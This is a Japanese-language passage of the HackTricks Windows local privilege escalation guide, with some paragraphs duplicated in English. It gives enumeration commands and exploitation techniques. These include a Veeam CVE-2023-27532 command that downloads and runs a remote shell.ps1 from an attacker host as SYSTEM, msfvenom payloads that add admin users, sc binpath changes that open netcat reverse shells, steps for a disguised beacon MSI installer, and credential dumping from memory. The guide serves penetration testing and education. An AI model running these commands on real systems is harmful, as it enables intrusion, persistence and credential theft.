# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最適なツール：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期の Windows 理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs に関する詳細は次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の Integrity Levels が何か分からない場合は、続行する前に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、システムの **列挙を妨げる**、実行可能ファイルの実行を阻止する、あるいはあなたの活動を **検知する** といった様々な要素があります。privilege escalation の列挙を開始する前に、次の **ページ** を **読み**、これらすべての **防御** **メカニズム** を **列挙** するべきです：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess プロセスが `RAiLaunchAdminProcess` を介して起動される場合、AppInfo の secure-path チェックがバイパスされると、プロンプトなしで High IL に到達するために悪用される可能性があります。専用の UIAccess/Admin Protection バイパス ワークフローはここを確認してください：


{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

Windows のバージョンに既知の脆弱性がないか確認してください（適用されているパッチも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョン脆弱性

This [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件以上のセキュリティ脆弱性があり、Windows 環境が提示する **巨大な攻撃面** を示しています。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれている)_

**システム情報を用いたローカル**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**エクスプロイトの Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

認証情報や重要な情報が環境変数に保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShellのトランスクリプトファイル

これを有効にする方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShellパイプラインの実行に関する詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、実行の完全な詳細や出力結果が必ずしも取得されるとは限りません。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershell のログから直近15件のイベントを表示するには、次のコマンドを実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全な活動記録と全内容がキャプチャされ、各コードブロックが実行時に記録されることを保証します。このプロセスは各操作の包括的な監査証跡を保持し、フォレンジックや悪意ある振る舞いの解析に有用です。実行時のすべての活動を記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。  
最後の20件のイベントを表示するには、次のコマンドを使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを侵害できます。

まず、ネットワークが non-SSL の WSUS 更新を使用しているかどうかを確認するには、cmd で次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellで次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信があった場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.  

そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` に等しい場合、  

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.  

この場合、**悪用可能です。** 最後のレジストリ値が `0` の場合、WSUS エントリは無視されます。

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.  

この脆弱性を悪用するには、次のようなツールを使用できます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — これらは MiTM を悪用したエクスプロイトスクリプトで、非SSL の WSUS トラフィックに 'fake' なアップデートを注入します。

Read the research here:  

研究は以下を参照:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

基本的に、このバグが悪用する欠陥は次のとおりです:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

> ローカルユーザのプロキシを変更する権限があり、Windows Update が Internet Explorer の設定で構成されたプロキシを使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分のトラフィックを傍受し、アセット上で昇格したユーザとしてコードを実行することが可能になります。
>
> さらに、WSUS サービスは現在のユーザの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名用に自己署名証明書を作成して現在のユーザの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを傍受できます。WSUS は証明書に対して trust-on-first-use 型の検証を実装する HSTS のような仕組みを持たないため、提示された証明書がユーザにより信頼されホスト名が正しければ、サービスはそれを受け入れます。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).  

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使用して悪用できます（入手可能になれば）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのエンタープライズ向けエージェントは localhost 上に IPC インターフェイスと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバに強制し、updater が rogue root CA を信頼するか署名検証が弱い場合、ローカルユーザは SYSTEM サービスがインストールする悪意のある MSI を配信できます。一般化した手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）は次を参照:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

Veeam B&R < `11.0.1.1261` は **TCP/9401** 上で localhost サービスを公開しており、攻撃者制御のメッセージを処理して **NT AUTHORITY\SYSTEM** として任意のコマンドを実行させることができます。

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.  
- **Recon**: リスナーとバージョンを確認する。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:  
- **Exploit**: 必要な Veeam DLL を同じディレクトリに置き、`VeeamHax.exe` のような PoC を配置して、ローカルソケット経由で SYSTEM のペイロードをトリガーします:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。

## KrbRelayUp

特定の条件下で、Windows **domain** 環境に **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる自身の権限を持っていること、およびユーザーがドメイン内にコンピュータを作成できることが含まれます。これらの **要件** は **デフォルト設定** で満たされることに注意してください。

次の場所で**exploit in**を見つけてください: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

攻撃の流れに関する詳細は次を参照してください: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**もし** これら2つのレジストリが **有効**（値が **0x1**）であれば、任意の権限を持つユーザーは `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用して、カレントディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。  
このスクリプトは、ユーザー/グループ追加を促すプリコンパイル済みの MSI インストーラを書き出します（そのため GIU アクセスが必要です）：
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、これらのツールを使って MSI ラッパーを作成する方法を学んでください。**.bat** ファイルをラップすれば、単に **command lines** を **execute** したいだけの場合にも対応できます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成する


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成する

- **生成** — Cobalt Strike または Metasploit を使用して、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を作成します。
- **Visual Studio** を開き、**Create a new project** を選択して検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のように付け、場所に **`C:\privesc`** を指定し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- **Next** をクリックし続け、ステップ 3/4（choose files to include）まで進みます。**Add** をクリックして、先ほど生成した Beacon ペイロードを選択します。続けて **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- インストールされるアプリをより正当性のある見た目にするために、**Author** や **Manufacturer** など他のプロパティも変更できます。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラー実行時に beacon ペイロードがすぐに実行されます。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後に、**ビルド**します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSI インストール

悪意のある `.msi` ファイルの **インストール** をバックグラウンドで実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます

## Antivirus and Detectors

### Audit Settings

これらの設定は何が**ログに記録されるか**を決定するため、注意してください
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されているかを把握することが重要です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル管理者パスワードの管理** を目的として設計されており、ドメインに参加しているコンピュータ上で各パスワードが **一意でランダム化され、定期的に更新** されることを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限が付与されたユーザだけがアクセスでき、許可された場合にローカル管理者のパスワードを閲覧できるようになっています。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

If active, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスがそのメモリを**読み取る**、またはコードを注入する試みを**ブロック**して、システムをさらに保護しています。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。目的は、デバイスに保存されている資格情報を pass-the-hash attacks のような脅威から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントで使用されます。ユーザーのログオン情報が登録されたセキュリティパッケージによって認証されると、通常そのユーザーの domain credentials が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループに興味深い権限がないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**何らかの特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格させる方法については以下を参照してください：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**詳しくは**このページで**token**が何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
次のページで、**興味深い token について学び、それらを悪用する方法**を確認してください：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを一覧表示するときは、**コマンドラインにパスワードが含まれていないかを確認してください**。\
実行中のバイナリを**上書きできるか**、またはバイナリフォルダに書き込み権限があり、[**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できるか確認してください:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)が実行されていないか確認してください。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**processes の binaries が置かれているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

稼働中のプロセスのメモリダンプは、sysinternals の **procdump** を使用して作成できます。FTP のようなサービスはメモリ上に **credentials in clear text in memory** を持っていることがあるので、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全な GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーが CMD を起動したりディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1)、"command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

Service Triggers により、特定の条件が発生したとき（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh、など）に Windows がサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発火させて特権サービスを起動できることがよくあります。列挙および起動手法は以下を参照してください：

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには **sc** を使用できます。
```bash
sc qc <service_name>
```
各サービスの必要な特権レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"が任意のサービスを変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

以下のエラーが発生している場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

以下の方法で有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存することを考慮してください（XP SP1 用）**

**別の回避策**は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を持っている場合、そのサービスの実行バイナリを変更することが可能です。バイナリを変更し、**sc** を実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は以下の権限を通じて昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリの再構成を許可します。
- **WRITE_DAC**: 権限の再設定を可能にし、サービスの設定を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: サービス設定を変更する権限を持ちます。
- **GENERIC_ALL**: 同様にサービス設定を変更する権限を持ちます。

この脆弱性の検出と悪用には _exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるか確認する**、またはバイナリが置かれているフォルダに**書き込み権限があるか確認する**（[**DLL Hijacking**](dll-hijacking/index.html)）**.**\
サービスによって実行されるすべてのバイナリは **wmic** (not in system32) を使って取得でき、**icacls** で権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また **sc** と **icacls** を使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるか確認してください.\
サービス**レジストリ**に対する**権限**を**確認**するには、次を実行します:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
サービスが実行するバイナリを変更できる可能性があるため、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているかどうかを確認する必要があります。

実行されるバイナリのパスを変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### サービスレジストリ AppendData/AddSubdirectory 権限

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分です：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 引用符で囲まれていない Service Paths

実行ファイルのパスが引用符で囲まれていない場合、Windows はスペースの前までの各区切りを順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**検出および悪用できます** この脆弱性はmetasploitで: `exploit/windows/local/trusted_service_path` 手動でサービスバイナリをmetasploitで作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能はbinaryを指すように設定できます。このbinaryが置き換え可能であれば、privilege escalationが可能になる場合があります。詳細は[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みのアプリケーション

次に、**permissions of the binaries**（上書きできればprivilege escalationが可能かもしれません）と**folders**（[DLL Hijacking](dll-hijacking/index.html)）の権限を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特定のファイルを読み取るためにconfig fileを変更できるか、またはAdministratorアカウントによって実行されるバイナリ（schedtasks）を変更できるか確認してください。

システム内の脆弱なフォルダ/ファイルの権限を見つける方法は次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
